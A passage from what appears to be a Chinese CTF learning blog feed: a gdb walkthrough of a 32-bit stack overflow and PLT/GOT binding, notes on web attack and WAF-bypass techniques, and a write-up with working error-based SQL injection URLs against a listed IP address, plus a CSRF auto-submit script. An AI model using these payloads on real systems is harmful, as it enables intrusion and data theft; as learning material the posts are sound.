ESP: 0xffffcbe0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>sub esp, 0xfffffff0</code>之后</p>
<pre class="line-numbers language-asm"><code class="language-asm">EBP: 0xffffcbe8
ESP: 0xffffcbd0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>mov DWORD PTR [esp],0x1</code>后,esp没变化<br>相当于是在栈顶<code>esp=0xffffcbd4</code>的时候执行了<code>push 0x1</code>,使得<code>esp = esp - 4</code><br><code>push xxx</code>和<code>mov DWORD PTR [esp], xxx</code>作用和区别:<br>一个会使esp变化一个不会</p>
<p>并且此时<code>x/x $esp</code>得到栈顶上的值是<code>0x01</code><br>好了,啰嗦了好多,像小学生一样</p>
<p><code>call 0x8048400</code> (IDA里看到的<code>call _alarm</code>)的时候,我们跟进看一下</p>
<pre class="line-numbers language-asm"><code class="language-asm">_alarm proc near
       jmp ds:off_804A014
_alarm endp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>再跟着跳过去,发现这个<code>ds:off_804A014</code>是属于<code>.got.plt</code></p>
<pre class="line-numbers language-asm"><code class="language-asm">.got.plt:0804A014  offset_804A014 dd offset alarm
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后我们不跟着他了,我们直接到<code>alarm</code>跑完到下一句</p>
<p>这个时候我们发现栈里的数据还没清理<br>我们alarm的形参<code>0x1</code>还在栈顶丢着<br>C里函数调用默认是<code>cdel</code>,从右到左压参数,caller清理现场,可没见到清理现场啊</p>
<p>接着看下面的代码</p>
<pre class="line-numbers language-asm"><code class="language-asm">
   0x80485a4:    call   0x8048400 <alarm@plt>
=> 0x80485a9:    mov    eax,ds:0x804a044 ;这句的0x804a044在IDa里是STDIN
   0x80485ae:    mov    DWORD PTR [esp+0x4],0xxxxxx0h    ;0
   0x80485b6:    mov    DWORD PTR [esp],eax  ;STDIN
   0x80485b9:    call   0x80483e0 <setbuf@plt>   ; setbuf(STDIN, 0)
   0x80485be:    mov    eax,ds:0x804a060
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们跑过压参数的这两句,然后stack里是这样子</p>
<pre class="line-numbers language-asm"><code class="language-asm">0000| 0xffffcbd0 --> 0xf7f9a5a0
0004| 0xffffcbd4 --> 0x0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>我装的是peda插件,最左边是相对于esp偏移(十进制的),偏移越小肯定是离栈顶越近咯<br>可以看到原来的栈顶<code>0xffffcbd0</code>这里存的是<code>0x1</code>来着<br>诶?看这个样子被调用者自己清理了栈???这个形参算是caller的还是calle的啊</p>
<p>跟一下<code>setbuf</code></p>
<pre class="line-numbers language-asm"><code class="language-asm">=> 0xf7e4dff0 <setbuf>:    sub    esp,0x10
   0xf7e4dff3 <setbuf+3>:    push   0x2000
   0xf7e4dff8 <setbuf+8>:    push   DWORD PTR [esp+0x1c]
   0xf7e4dffc <setbuf+12>:    push   DWORD PTR [esp+0x1c]
   0xf7e4e000 <setbuf+16>:    call   0xf7e48210 <setbuffer>
   0xf7e4e005 <setbuf+21>:    add    esp,0x1c
   0xf7e4e008 <setbuf+24>:    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>有点迷…..</p>
<p>喝了口水,反应过来是这样子的,前面看到的几个函数都是<code>glibc</code>里提供的…<br>这里有一个延迟加载的措施,其实比较复杂,我们进入到的这个<code>setbuf</code>,只是<code>glibc</code>里的一个跳台,这个帮真正的<code>setbuf</code>把参数压进去,然后才调到真正起作用的<code>setbuffer</code></p>
<p>这里的<code>setbuf</code>调用<code>setbuffer</code>的地方倒是像是<code>cdel</code><br>先从坐到右参数压了栈</p>
<pre class="line-numbers language-asm"><code class="language-asm">0000| 0xffffcbb0 --> 0xf7f9a5a0 ;STDIN
0004| 0xffffcbb4 --> 0x0    ; 0
0008| 0xffffcbb8 --> 0x2000 ; 不知道是啥
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后调<code>setbuffer</code><br>最后调用之后<code>add esp, 0x1c</code> 对应原来的<code>sub esp, 0x10</code><br>很明显这多出来的<code>0x0c</code>是caller<code>setbuf</code>对堆栈的清理<br>把给callee<code>setbuffer</code>传的三个参数给清理掉</p>
<p>再跟一下<code>stebuffer</code>,发现和我们想的是一样的了</p>
<pre class="line-numbers language-asm"><code class="language-asm">0000| 0xffffcbac --> 0xf7e4e005  ;ret_addr
0004| 0xffffcbb0 --> 0xf7f9a5a0  ;arg1
0008| 0xffffcbb4 --> 0x0         ;arg2
0012| 0xffffcbb8 --> 0x2000 ('') ;arg3
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面是<code>0xf7e4e005</code>的具体逻辑就不看了<br>我们直接跳出<code>setbuffer</code>, 跳出<code>setbuf</code><br>回来<code>main</code>里</p>
<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><p>别看到返回地址就打断点,那个返回地址是栈里的,你没法打断<br>打断点好像只能在<code>.text段</code></p>
<p>callee清理栈方式</p>
<pre class="line-numbers language-asm"><code class="language-asm">ret n
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>caller清理栈方式</p>
<pre class="line-numbers language-asm"><code class="language-asm">add esp, 0x0c
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们回到main,下面又是两个一毛一样的<code>stebuf</code></p>
<pre class="line-numbers language-asm"><code class="language-asm">=> 0x80485be:    mov    eax,ds:0x804a060
   0x80485c3:    mov    DWORD PTR [esp+0x4],0x0
   0x80485cb:    mov    DWORD PTR [esp],eax
   0x80485ce:    call   0x80483e0 <setbuf@plt> ; setbuf(sdout, 0)
   0x80485d3:    mov    eax,ds:0x804a040
   0x80485d8:    mov    DWORD PTR [esp+0x4],0x0
   0x80485e0:    mov    DWORD PTR [esp],eax
   0x80485e3:    call   0x80483e0 <setbuf@plt> ; setbuf(stderror, 0)
   0x80485e8:    mov    DWORD PTR [esp],0x8048690 ; "puts your name:"
   0x80485ef:    call   0x8048410 <puts@plt> ;puts("puts your name")
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里也看清楚了call的是<code>&lt;setbuf@plt&gt;</code><br>其实读代码大概是这样子的<br>诶,我有个疑问,这个代码怎么感觉和我调试的不太一样啊,我看蠢了等下</p>
<p>先看下main这里的代码</p>
<pre class="line-numbers language-asm"><code class="language-asm">gdb-peda$ x/10i 0x8048594
   0x8048594:    push   ebp
   0x8048595:    mov    ebp,esp
   0x8048597:    and    esp,0xfffffff0
   0x804859a:    sub    esp,0x10
   0x804859d:    mov    DWORD PTR [esp],0x1
   0x80485a4:    call   0x8048400 <alarm@plt>
   0x80485a9:    mov    eax,ds:0x804a044
   0x80485ae:    mov    DWORD PTR [esp+0x4],0x0
   0x80485b6:    mov    DWORD PTR [esp],eax
   0x80485b9:    call   0x80483e0 <setbuf@plt>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后跟着过去看下<code>call   0x80483e0 &lt;setbuf@plt&gt;</code></p>
<pre class="line-numbers language-asm"><code class="language-asm">gdb-peda$ x/10i 0x80483e0
   0x80483e0 <setbuf@plt>:    jmp    DWORD PTR ds:0x804a00c
   0x80483e6 <setbuf@plt+6>:    push   0x0
   0x80483eb <setbuf@plt+11>:    jmp    0x80483d0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>大概是这样子的</p>
<pre class="line-numbers language-asm"><code class="language-asm">+----------------+-------------------+-----------
    ELF               PLT表             GOT表
+----------------+-------------------+----------
call <setbuf@plt> =>  jmp *0x804a00c =>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个plt是不允许写的,但这个GOT很明显是可以写的,但如果动态链接的话,在你编译的时候没法确定这个你要调用的库函数的地址,所以很明显这个GOT很明显开始放的不是真正的setbuf的地址</p>
<p>准确的说是,在setbuf第一次调用的时候,setbuf的got表项<code>&lt;setbuf@got.plt&gt;</code>里存的是<code>&lt;setbuf@plt+6&gt;</code>的地址,现在看看我们的<code>plt表</code>,是不是发现有三条</p>
<pre class="line-numbers language-asm"><code class="language-asm">0x80483e0 <setbuf@plt>:    jmp    DWORD PTR ds:0x804a00c
0x80483e6 <setbuf@plt+6>:    push   0x0
0x80483eb <setbuf@plt+11>:    jmp    0x80483d0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这个我们会从<code>&lt;setbuf@got.plt&gt;</code>调到这个<code>&lt;setbuf@plt+6&gt;</code>,然后走到<code>&lt;setbuf@plt+11&gt;</code>,这里会jmp一下,jmp到哪里了呢,我们看下<code>0x80483d0</code>这个地址</p>
<pre class="line-numbers language-asm"><code class="language-asm">gdb-peda$ x/10i 0x80483d0
   0x80483d0:    push   DWORD PTR ds:0x804a004
   0x80483d6:    jmp    DWORD PTR ds:0x804a008   ;jmp *0x804a008 不是 jmp 0x0804a008
   0x80483dc:    add    BYTE PTR [eax],al
   0x80483de:    add    BYTE PTR [eax],al

   0x80483e0 <setbuf@plt>:    jmp    DWORD PTR ds:0x804a00c
   0x80483e6 <setbuf@plt+6>:    push   0x0
   0x80483eb <setbuf@plt+11>:    jmp    0x80483d0

   0x80483f0 <read@plt>:    jmp    DWORD PTR ds:0x804a010
   0x80483f6 <read@plt+6>:    push   0x8
   0x80483fb <read@plt+11>:    jmp    0x80483d0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>跳到了这个其实是<code>plt</code>表的开头,你可以发现<br>这个<code>plt</code>除了最开始的两句算是公共的表项,剩下的每个函数对应三句话,第三局都是跳转到plt表的开头,之后应该是又跳到什么地方然后把对应的GOT标表项改过来了就完结了吧</p>
<p>大概是这样子<br>setbuf第一次调用</p>
<pre class="line-numbers language-asm"><code class="language-asm">main => <setbuf@plt> => <setbuf@got.plt> => <setbuf@plt+6> => <setbuf@plt+11> => plt表首 => 然后不知道经过了啥 => <setbuf@got.plt>里填上了真的setbuf的地址
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>拿出来我的小书书查了下这个不知道经过啥其实是在<code>plt</code>表首jmp到了一下<code>_dl_runtime_resolve()</code>,函数完成了地址绑定</p>
<pre class="line-numbers language-asm"><code class="language-asm">gdb-peda$ x/10i *0x804a008 ;注意是取出jmp * ,别把星号丢了
   0xf7fedf00:    push   eax
   0xf7fedf01:    push   ecx
   0xf7fedf02:    push   edx
   0xf7fedf03:    mov    edx,DWORD PTR [esp+0x10]
   0xf7fedf07:    mov    eax,DWORD PTR [esp+0xc]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上网查了下这一段确实是<code>_dl_runtime_resolve()</code>的源码<br>还有补充说是<code>.got.plt</code>的前三项(每一项4字节)代表的分别是</p>
<pre class="line-numbers language-asm"><code class="language-asm">0x804a000:    0x08049f14      ; .dynamic段地址
0x804a004:  0xf7ffd918      ; module_id
0x804a008:  0xf7fedf00      ; dl_runtime_resolve地址
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>setbuf第n次调用</p>
<pre class="line-numbers language-asm"><code class="language-asm">main => <setbuf@plt> => <setbuf@got.plt> => 成功调用
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>好吧,动态绑定这一块好像都搞清楚了<br>刚说到哪里了,对.我们走走走,回到了main里,我们刚刚是调用了puts</p>
<pre class="line-numbers language-asm"><code class="language-asm">=> 0x80485ef:    call   0x8048410 <puts@plt>
   0x80485f4:    call   0x804854d
   0x80485f9:    mov    eax,0x0
   0x80485fe:    leave  
   0x80485ff:    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们看<code>0x0804854d</code>这里调用了什么函数</p>
<pre class="line-numbers language-asm"><code class="language-asm">=> 0x804854d:    push   ebp
   0x804854e:    mov    ebp,esp
   0x8048550:    sub    esp,0x98         ; 栈抬高0x98 => old_esp = esp + 0x98
   0x8048556:    mov    DWORD PTR [esp+0x8],0x100    ; 这个是后面要调用的函数的arg3
   0x804855e:    lea    eax,[ebp-0x88]   ; 这个时候[ebp-0x88]相当于[old_esp - 0x88] => [esp + 0x10] ; 其实这个换算了也没啥意思,因为是lea,传地址,用谁算都一样
   ; 我的$esp =  0xffffcb30 , 所以这句之后$eax = 0xffffcb30 + 0x10 = 0xffffcb40
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>mov ebp, esp</code>后,栈里的数据</p>
<pre class="line-numbers language-asm"><code class="language-asm">0000 0xffffcbc8 --> 0xffffcbe8      ;ebp
0004 0xffffcbcc --> 0x80485f9       ;ret_addr
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>再接着看</p>
<pre class="line-numbers language-asm"><code class="language-asm">   0x804855e:    lea    eax,[ebp-0x88]               ; $eax = 0xffffcb40
=> 0x8048564:    mov    DWORD PTR [esp+0x4],eax      ; arg2 = $eax
   0x8048568:    mov    DWORD PTR [esp],0x0          ; arg1 = 0x0
   0x804856f:    call   0x80483f0 <read@plt>         ; read(0x0, 0xffffcb40, 0x100)
   0x8048574:    mov    DWORD PTR [esp+0x8],0x100
   0x804857c:    lea    eax,[ebp-0x88]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到这里,发现是给调用了<code>read</code>,其实这里的<code>arg2</code>的值是什么不重要,重要的是他是<code>[ebp-0x88]</code>,就是说他离<code>ebp</code>有<code>0x88</code>的距离,大概是这样子<br>压完3个参数,但还没call之前栈里大概是这样子的</p>
<pre class="line-numbers language-asm"><code class="language-asm">0xffffcb30  +----------------------+  [esp] = arg1 
                arg1 [0x0]
0xffffcb34  +----------------------+  [esp+0x4] = arg2
                arg2 [0xffffcb40] -------------------------------+
0xffffcb38  +----------------------+  [esp+0x8] = arg3           |
                arg3 [0x100]                                     |
0xffffcb40  +----------------------+  [esp+0x10]                 |
               0x88个字节的缓冲区  <-----------------------------+
0xffffcbc8  +----------------------+  [esp+0x98] [ebp]; 开始抬起来0x98
                EBP
0xffffcbcc  +----------------------+  [esp+0x9c] 
                ret_addr
0xffffcbd0  +----------------------+  [esp+0x100]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样子写入地址距离ebp是0x88,但read可写入0x100的数据,这样子我们就能覆盖到返回地址<code>ret_addr</code></p>
<p>理论上我们只要构造</p>
<pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print 0x88 * 'A' + 'ABCD' + our_ret_addr"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就能填满0x88大小的缓冲区,用<code>ABCD</code>覆盖4字节的EBP,然后更改返回地址</p>
<p>然后我们查了一下checksec</p>
<pre class="line-numbers language-asm"><code class="language-asm">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现开了<code>NX</code>,堆栈不可执行,所以我们,可以使用<code>ret2libc</code>的方法<br>不知道为什么这题到了<code>read</code>这里没有提示我输入…</p>
<p>所以我是<code>start &lt; in.data</code>这样子调试的,确认了一下,这个字节数是正确的</p>
<p>然后写完poc发现不能用,这个时候上网查找了一下,pwntools有启<code>gdb</code>的功能,让我试试</p>
<pre class="line-numbers language-python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>简直不能太赞,但似乎,有一点问题,我怎么让停在第一句呢,去翻了翻官网</p>
<blockquote>
<p>Attaching to processes with attach() is useful, but the state the process is in may vary. If you need to attach to a process very early, and debug it from the very first instruction (or even the start of main), you instead should use debug()</p>
</blockquote>
<p>哦,我不应该用attach,应该是用<code>gdb.debug()</code><br>差不多,是这样子的</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> debug <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'/home/haibin/nsctf/pwn/pwn1'</span><span class="token punctuation">,</span><span class="token triple-quoted-string string">'''
    start
    continue
    '''</span><span class="token punctuation">)</span> 
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>试了好多次,好像这里必须写成<code>start continue</code>才会刚好停在<code>main</code>的入口处…别的要不报错,要不停的太远…吐血<br>不过这个半路就GG了,连接被重置,气死了…<br>迷之.因为我payload没写完,这个时候我在最后加了一句</p>
<pre class="line-numbers language-python"><code class="language-python">p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>突然发现都好了…醉了<br>大概是明白了,脚本执行完之后就会断开,这里加了这句,拖住了他???<br>这样子好像行不通….这个<code>p.interactive()</code>会拖住脚本的运行<br>把他加在最后面的话,前面的脚本还是相当于都执行完了,而如果把他加在最前面那相当于这句话之后的脚本都不执行了…</p>
<p>心碎,要睡一觉</p>
<p>代码里有一个leave指令其实相当于</p>
<pre class="line-numbers language-asm"><code class="language-asm">mov esp, ebp
pop ebp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>当然这个<code>pop ebp</code>之后,<code>esp</code>又会<code>esp+4</code>对吧</p>
<h3 id="关于调用规约"><a href="#关于调用规约" class="headerlink" title="关于调用规约"></a>关于调用规约</h3><pre class="line-numbers language-c"><code class="language-c">__cdecl       caller清理参数<span class="token punctuation">,</span>右向左入栈
__stdcall     callee清理参数<span class="token punctuation">,</span>右向左入栈
__fastcall    callee清理参数<span class="token punctuation">,</span>前两个参数寄存器传参数<span class="token punctuation">,</span>其余右向左压入栈
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>fastcall寄存器传参,所以叫fast,使用高性能场合<br>可变长参数函数只能使用<code>__cdecl</code>,网上的解释是说只有调用者才知道传入了多少参数,以用来清理参数,回收栈空间,这个理由没法说服我,也许是我没有完全理解</p>
<p>另外</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> WINAPI     __stdcall</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[阶段性总结]]></title>
      <url>/2017/07/20/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>整个注入就是通过闭合原来的语句或者去他方式来改变原来的逻辑</p>
<h3 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h3><p>主要是窃取管理员cookie,然后盗取身份</p>
<p>同源策略[SOP]</p>
<ul>
<li>web SOP<ul>
<li>端口号</li>
<li>协议</li>
<li>domain</li>
</ul>
</li>
<li>cookie SOP<ul>
<li>domain</li>
<li>path</li>
</ul>
</li>
<li>跨域<ul>
<li>window.name</li>
<li>JSONP</li>
<li>PostMessage</li>
</ul>
</li>
<li>同源绕过<ul>
<li>特定软件比如JAVA，FLASH</li>
</ul>
</li>
</ul>
<p>bypass WAF</p>
<ul>
<li>eval还有的话,String.fromCharCode还是很稳的</li>
<li>带src的都可以</li>
<li>window.location跳转一波</li>
</ul>
<p>bypass CSP</p>
<ul>
<li>link prefetch(跨域) + ajax(需要unsafe inline)</li>
<li>sourceMapUrl(跨域)</li>
</ul>
<p>bypass sandbox</p>
<ul>
<li>用iframe的函数</li>
</ul>
<p>小trick</p>
<ul>
<li>获取其他路径下的cookie，通过一个iframe</li>
</ul>
<p>还有蠕虫</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>分类</p>
<ul>
<li>报错注入<ul>
<li>常用xpath</li>
</ul>
</li>
<li>union<ul>
<li>常常过滤了<code>union</code>和<code>select</code></li>
</ul>
</li>
<li>盲注<ul>
<li>基于布尔(看页面变化)</li>
<li>基于时间(看响应时间)</li>
</ul>
</li>
<li>堆叠查询<ul>
<li>mysql+php比较少见</li>
</ul>
</li>
</ul>
<p>bypass WAF</p>
<ul>
<li><p>逗号</p>
<ul>
<li>limit =&gt; limit 1 offset 4</li>
<li>union =&gt; union select * from xxx join yyy</li>
<li>mid/substr =&gt; mid(user() from 1 for 1)</li>
</ul>
</li>
<li><p>空格</p>
<ul>
<li>注释</li>
<li>数字，科学计数法，小数点，运算符</li>
<li>NULL</li>
<li>圆括号，花括号，反引号</li>
</ul>
</li>
<li><p>单引号</p>
<ul>
<li>十六进制</li>
</ul>
</li>
<li><p>字段名</p>
<ul>
<li>select 1,2,3,4 union select * from vuln;</li>
</ul>
</li>
</ul>
<p>小trick</p>
<ul>
<li>反引号在能放置别名的地方做注释</li>
<li>select * from xxx into @a,@b,….临时变量出字段数代替order by</li>
<li>临时变量还有其他的用</li>
</ul>
<p>其他</p>
<ul>
<li>不开启<code>strict_all_table</code>,可能导致用户名超长截断</li>
<li>二次注入，过引号，逻辑上的回显</li>
<li>宽字节注入</li>
</ul>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>通过结束原来的命令来执行一条新的命令</p>
<h3 id="HTTP请求头注入"><a href="#HTTP请求头注入" class="headerlink" title="HTTP请求头注入"></a>HTTP请求头注入</h3><p>CR/LF攻击</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>php伪协议</p>
<ul>
<li>读源码</li>
<li>zip/phar小马</li>
</ul>
<p>一堆截断方式,%00,./这些在新版本里都不能用了</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>加入csrf_token<br>加入<code>Referer</code>的验证</p>
<p>CSRF一般是构造表单<br>然后自动提交</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
function csrf_attack() {
    document.getElementById('csrf_submit').click();
}
window.onload = csrf_attack;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在添加点样式啥的比如<code>display:none</code></p>
<h3 id="CSRF-和-XSS区别"><a href="#CSRF-和-XSS区别" class="headerlink" title="CSRF 和 XSS区别"></a>CSRF 和 XSS区别</h3><p>XSS漏洞通过xss代码获取受害者Cookie，之后通过设置Cookie可以冒充受害者，比如管理员<br>CSRF漏洞只受害者浏览了恶意网站相当于自己触动了操作</p>
<h3 id="CSRF结合XSS"><a href="#CSRF结合XSS" class="headerlink" title="CSRF结合XSS"></a>CSRF结合XSS</h3><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>bypass</p>
<ul>
<li>10进制，十六进制，8进制</li>
<li>限制了协议，用302跳转以支持gopher和其他协议</li>
<li>DNS rebinding</li>
<li>redis<ul>
<li>dict</li>
<li>gopher</li>
</ul>
</li>
</ul>
<h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>在登录前后应该换不同的cookie</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[一道题目]]></title>
      <url>/2017/07/17/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p><a href="http://114.55.36.69:20680/" target="_blank" rel="external">http://114.55.36.69:20680/</a><br>做了n久做不出,也不知道题目是哪里来的</p>
<h2 id="咸鱼的我"><a href="#咸鱼的我" class="headerlink" title="咸鱼的我"></a>咸鱼的我</h2><p>过滤了<code>*</code>,<code>union</code>,<code>column</code><br>所以爆出来表名就不知所措了</p>
<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news&id=1 or(updatexml(1,concat(0x7e,(SELECT distinct group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1))

=> '~error_flag,error_news~'
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后后感觉<code>id</code>这里过滤好严,试一试<code>table</code>那里</p>
<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news`%23&id=1
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样子应该是把他截断了,所以显示是正常的<br>然后很笨的我尝试在后边加东西发现….<br>啊，怎么没用</p>
<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news` where id =4 %23&id=1
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我就是这么菜，就停在这里了</p>
<p>然后后来问了大佬</p>
<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news`%23`where id =4 %23&id=1 (%23是注释#)
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>知道这样子就可以了</p>
<p>大概是先<code>desc</code>了table，然后table存在的情况下才进行查询,而且才知道<code>table</code>这里过滤不严</p>
<p>按照大佬说的大概是</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">desc</span> <span class="token punctuation">`</span>error_${<span class="token keyword">table</span>}<span class="token punctuation">`</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">-- table存在的话,再</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> error_${<span class="token keyword">table</span>} <span class="token keyword">where</span> id <span class="token operator">=</span> $id<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>问了下Bendawang师傅，果然。。。师傅做题就和切菜一样，几分钟丢回来一个答案</p>
<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=flag`%23` where 0=extractvalue(1,(select flag_you_will_never_know from error_flag))%23`&id=1
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>他这个能够判断出有无table，只能是提前先执行了show COLUMNS 或是desc</p>
</blockquote>
<p>然后学习了QAQ<br>这个</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token punctuation">`</span><span class="token comment" spellcheck="true">#`....#</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>如果列名前缀有有一个`,那第一个`闭合了前面的`,然后第一个#就可以注释掉后面的<br>如果列名前缀没有`,那`#`就作为列名的别名，最后一个#起到注释作用</p>
</blockquote>
<pre><code>这里真的是学习了
</code></pre><h2 id="后来的后来"><a href="#后来的后来" class="headerlink" title="后来的后来"></a>后来的后来</h2><p>查到了一篇wp,但还是不知道这题目从哪里来的</p>
<p><a href="http://www.wupco.cn/?p=3764" target="_blank" rel="external">http://www.wupco.cn/?p=3764</a></p>
<p>然后果然就是Bendawang师傅说的那样…真是好强啊(我好菜啊…)</p>
<p>顺便收一下大佬<a href="http://www.wupco.cn/" target="_blank" rel="external">blog</a></p>
<p>然后突然发现在同一个ip还有一道题目 <a href="https://moe.sh/article/19" target="_blank" rel="external">https://moe.sh/article/19</a></p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[allow_url_fopen]]></title>
      <url>/2017/07/17/allow-url-fopen/</url>
      <content type="html"><![CDATA[<p>在php里<br><code>allow_url_fopen</code>默认是开启<br><code>allow_url_include</code>默认是关闭的<br>而且他们只能在<code>php.ini</code>里设置,开始还用<code>ini_set</code>试了下果然不能改</p>
<h2 id="官网定义"><a href="#官网定义" class="headerlink" title="官网定义"></a>官网定义</h2><h3 id="allow-url-fopen"><a href="#allow-url-fopen" class="headerlink" title="allow_url_fopen"></a>allow_url_fopen</h3><blockquote>
